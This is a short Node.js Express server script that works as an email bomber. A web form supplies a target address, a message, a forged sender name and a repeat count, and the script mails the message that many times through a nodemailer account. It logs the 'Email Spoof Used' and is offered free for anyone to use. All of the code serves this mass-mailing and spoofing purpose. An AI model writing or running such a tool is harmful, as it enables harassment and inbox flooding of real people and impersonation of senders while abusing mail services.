/* Developed by Felipe Garcia Diaz
Free for anyone to use and change, no credit needed
Developed as part of the pylot security company
*/

var express = require("express");
var smtp = require("nodemailer");
const bodyParser = require("body-parser");
var app = express();
app.use("/", express.static(__dirname));
app.use(bodyParser.urlencoded({extended: true}));

//Handle POST Requests sent by clients
app.post("/sendText", (req, res) => {
    //Reload Website
    res.redirect(req.get('referer'));

    var amt = parseInt(req.body.int);
    //Log In To Email
    email = smtp.createTransport({
        service: "serice_goes_here ex:(service:'gmail'),", //Service I.E. What email service
        auth: {
            user: "email", //Your Email
            pass: "passwd" //Your Password
        }
    });
    //Parse and arrange all sent data to compose an email
    var sendEMail = {
        from: req.body.uniq + ">:)",
        to: req.body.email,
        subject: "Message for " + req.body.email,
        text: req.body.comm
    };
    //Send Email Function
    function nodeSendMail(verboseMode) {
        email.sendMail(sendEMail, (err, data) => {
            if(verboseMode == true) {
                //Log Any Potential Errors
                if(err) return console.log(err);
            }
        });
    }
    //Send Email a certain amout of times, as requested by the clients
    for(var i = 0; i <= amt; i++){
        nodeSendMail(true);
    }
    console.log("user with " + req.ip + " sent the message:\n" + req.body.comm + "\n\nAmount: " + amt + " Time(s)\nEmail: " + req.body.email +"\nEmail Spoof Used: " + req.body.uniq);

});
//Enable server, via designated port
port = 8283;
app.listen(port, () => {
    console.log("Unlocked, server has been activated\nport: " + port);
});
